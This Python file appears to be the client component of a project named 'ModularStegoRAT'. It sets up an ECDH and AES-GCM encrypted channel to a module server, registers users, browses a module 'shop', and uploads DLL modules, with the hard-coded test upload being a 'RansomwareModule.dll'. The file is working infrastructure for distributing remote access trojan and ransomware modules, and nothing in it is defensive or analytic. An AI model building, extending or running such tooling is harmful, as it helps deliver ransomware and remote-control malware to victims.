import os
import json
import base64
import socket
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric.ec import EllipticCurvePublicKey, EllipticCurvePrivateKey

#Constants
DATABASE_CONNECTION_HOST = "127.0.0.1"
DATABASE_CONNECTION_PORT = 12345
KEYFILE_PATH = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Python"
DB_INIT_SIZE_BYTES = 1024
DB_SHOP_SIZE_BYTES_CLIENT = 1024
DB_SHOP_SIZE_BYTES_SERVER = 8192

def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
    oldNonceInt = int.from_bytes(oldNonce, byteorder="big")
    oldNonceInt = (oldNonceInt + increment) % (1 << 96) #Wraparound
    nonce = oldNonceInt.to_bytes(12, byteorder="big")
    return nonce

def CreateECCKeypair() -> tuple[EllipticCurvePublicKey, bytes, EllipticCurvePrivateKey, bytes]:
    if(os.path.exists(os.path.join(KEYFILE_PATH, "ClientPrivateKey.pem"))):
        with open(os.path.join(KEYFILE_PATH, "ClientPrivateKey.pem"), "rb") as f:
            privateKey = serialization.load_pem_private_key(
                f.read(),
                password=None  
            ) 
        
        with open(os.path.join(KEYFILE_PATH, "ClientPublicKey.pem"), "rb") as f:
            publicKey = serialization.load_pem_public_key(
                f.read()
            ) 
            
        privateKeyBytes = privateKey.private_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
        publicKeyBytes = publicKey.public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint
        )        
    else:
        privateKey = ec.generate_private_key(ec.SECP256R1())
        publicKey = privateKey.public_key()

        pemPrivate = privateKey.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()  
        )
        with open("ClientPrivateKey.pem", "wb") as f:
            f.write(pemPrivate)
            
        pemPublic = publicKey.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        with open("ClientPublicKey.pem", "wb") as f:
            f.write(pemPublic)
            
        privateKeyBytes = privateKey.private_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
        publicKeyBytes = publicKey.public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint
        ) 
    
    return (publicKey, publicKeyBytes, privateKey, privateKeyBytes)

def InitServerConnection() -> tuple[AESGCM, socket.socket]:
    dbSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    dbSocket.connect((DATABASE_CONNECTION_HOST, DATABASE_CONNECTION_PORT))

    #Deriving an AES key using ECDHE
    alicePrivate = ec.generate_private_key(ec.SECP256R1())
    alicePublic = alicePrivate.public_key()

    #Sending alice public to bob the database
    alicePublicBytes = alicePublic.public_bytes(
        encoding=serialization.Encoding.X962,
        format=serialization.PublicFormat.UncompressedPoint
    )

    aliceTransmission = json.dumps({"Alice Public" : base64.b64encode(alicePublicBytes).decode()})

    dbSocket.send(aliceTransmission.encode().ljust(1024, b"\0"))
    bobTransmission = json.loads(dbSocket.recv(1024).rstrip(b"\0").decode())
    bobPublicBytes = base64.b64decode(bobTransmission["Bob Public"])
    bobPublic = ec.EllipticCurvePublicKey.from_encoded_point(
        ec.SECP256R1(),
        bobPublicBytes
    )

    aliceSharedSecret = alicePrivate.exchange(
        ec.ECDH(),
        bobPublic
    )

    AESKey = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"Client-DB-Handshake",
    ).derive(aliceSharedSecret)

    aes = AESGCM(AESKey)
    
    return (aes, dbSocket)

def DefineNewUser(usernameDecrypt : str, passwordDecrypt : str):
    
    aes, dbSocket = InitServerConnection()
    
    seedNonce = os.urandom(12)
    request = json.dumps({
        "Nonce": base64.b64encode(seedNonce).decode(), 
        "Type" : base64.b64encode(aes.encrypt(seedNonce, "DEFINE_NEW_USER".encode(), None)).decode(),
        "Username" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 1), usernameDecrypt.encode(), None)).decode(),
        "Password" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 2), passwordDecrypt.encode(), None)).decode(),
        "Public Key" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 3), publicKeyBytes, None)).decode()
    })
    
    request = request.encode().ljust(DB_INIT_SIZE_BYTES, b"\0")
    dbSocket.send(request)
    
    dbResponse = json.loads(dbSocket.recv(1024).rstrip(b"\0").decode())
    dbResponseSuccessMarker = aes.decrypt(IncrementNonce(seedNonce, 4), base64.b64decode(dbResponse["Response"]), None).decode()
    print(f"Response : {dbResponseSuccessMarker}")
    dbSocket.shutdown(socket.SHUT_RDWR)
    dbSocket.close()

def UploadNewModule(moduleName : str, DLLPath : str, description : str, username : str, password : str, publicKeyBytes : bytes, dependencies : str):
    aes, dbSocket = InitServerConnection()
    
    seedNonce = os.urandom(12)
    request = json.dumps({
        "Nonce": base64.b64encode(seedNonce).decode(), 
        "Type" : base64.b64encode(aes.encrypt(seedNonce, "UPLOAD_NEW_MODULE".encode(), None)).decode(),
        "Module Name" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 1), moduleName.encode(), None)).decode(),
        "Module Description" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 2), description.encode(), None)).decode(),
        "DLL Size" :  base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 6), str(os.path.getsize(DLLPath)).encode(), None)).decode(),
        "Dependencies" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 7), json.dumps(dependencies).encode(), None)).decode(),
        #Login info to link to ourselves
        "Username" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 3), username.encode(), None)).decode(),
        "Password" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 4), password.encode(), None)).decode(),
        "Public Key" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 5), publicKeyBytes, None)).decode(),
    })
    
    request = request.encode().ljust(DB_INIT_SIZE_BYTES, b"\0")
    dbSocket.send(request)
    
    dbResponse = json.loads(aes.decrypt(IncrementNonce(seedNonce,8), dbSocket.recv(1024).rstrip(b"\0"), None).decode())
    print(dbResponse)

    seedNonceIncrement = 9
    amountToSend = os.path.getsize(DLLPath)
    if(dbResponse["Status"] == "ACCEPTED"):
        with open(DLLPath, "rb") as f:
            while(amountToSend > 0):
                chunk = f.read(min(amountToSend, 65536))

                print(int.from_bytes(seedNonce))

                print(len(aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), chunk, None)))
                
                dbSocket.send(aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), chunk, None))
                amountToSend -= min(amountToSend, 65536)
                seedNonceIncrement += 1
    
        dbResponse = json.loads(aes.decrypt(IncrementNonce(seedNonce,seedNonceIncrement), dbSocket.recv(1024).rstrip(b"\0"), None).decode())
        print(dbResponse)
        
    dbSocket.shutdown(socket.SHUT_RDWR)
    dbSocket.close()

def StartShop() -> tuple[AESGCM, socket.socket, bytes]:
    aes, dbSocket = InitServerConnection()
    
    seedNonce = os.urandom(12)
    request = json.dumps({
        "Nonce": base64.b64encode(seedNonce).decode(), 
        "Type" : base64.b64encode(aes.encrypt(seedNonce, "OPEN_SHOP".encode(), None)).decode(),
    })
    
    request = request.encode().ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
    dbSocket.send(request)
    
    return (aes, dbSocket, seedNonce)

def CloseShop(shopAES : AESGCM, shopSocket : socket.socket, shopSeedNonce : bytes, shopSeedNonceIncrement : int):    
    request = json.dumps({
        "Type" : "CLOSE_SHOP"
    }).encode()
    
    request = shopAES.encrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement), request, None).ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
    shopSocket.send(request)
    
    shopSocket.shutdown(socket.SHUT_RDWR)
    shopSocket.close()

def ReformatTimestamp(oldTimestamp : str) -> str:
    timestampSplit = oldTimestamp.split("-")
    newTimestamp = f"{timestampSplit[2]}/{timestampSplit[1]}/{timestampSplit[0]} {timestampSplit[3]}:{timestampSplit[4]}:{timestampSplit[5]} (UTC)" 
    return newTimestamp

def BrowseShop(shopAES : AESGCM, shopSocket : socket.socket, shopSeedNonce : bytes, shopSeedNonceIncrement : int, pageNo : int = 0, entriesPerPage : int = 16) -> int:    
    request = json.dumps({
        "Type" : "BROWSE_SHOP",
        "Page Number" : pageNo,
        "Entries Number" : entriesPerPage 
    }).encode()
    
    request = shopAES.encrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement), request, None).ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
    shopSocket.send(request)
    
    response = shopSocket.recv(DB_SHOP_SIZE_BYTES_SERVER).rstrip(b"\0")
    response = shopAES.decrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement + 1), response, None).decode()
    response = json.loads(response)
    
    print(response["Status"])
    
    entries = response["Entries"]
    print("-"*20)
    for entry in entries:
        print(
f"""
ID: {entry["Module ID"]}
Name: {entry["Module Name"]}
Owner : {entry["Module Owner Username"]}
Version : {entry["Module Version"]}
Last Edited: {ReformatTimestamp(entry["Module Last Edited"])}
Dependencies : {entry["Dependencies"] if (entry["Dependencies"] != '""') else "None"}

Description:
{entry["Module Description"]} 
""")
        
        print("-"*20)
    
    return shopSeedNonceIncrement + 2
    
publicKey, publicKeyBytes, privateKey, privateKeyBytes = CreateECCKeypair()

running = True
shopping = False
currentShopPage = -1

while running:
    userInput = input()
    if(userInput == ".define" and (not shopping)):
        DefineNewUser("TestUser", "TestPass")
    
    elif(userInput == ".upload" and (not shopping)):
        UploadNewModule(
            "TestMod2", 
            "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Modules\\RansomwareModule\\x64\\Debug\\RansomwareModule.dll", 
            "This is a 2nd test mod", 
            "TestUser", 
            "TestPass", 
            publicKeyBytes, 
            "")

    elif(userInput == ".openShop" and (not shopping)):
        shopAES, shopSocket, shopSeedNonce = StartShop()
        shopSeedNonceIncrement = 1
        shopping = True
    
    elif(userInput == ".browseShop" and shopping):
        if(currentShopPage == -1):
            currentShopPage = 0
        
        shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
    
    elif(userInput == ".browseShopNext" and shopping):
        currentShopPage += 1
        shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
    
    elif(userInput == ".closeShop" and shopping):
        CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
        shopping = False
    
    elif(userInput == ".quit"):
        running = False
        if(shopping):
            CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
            shopping = False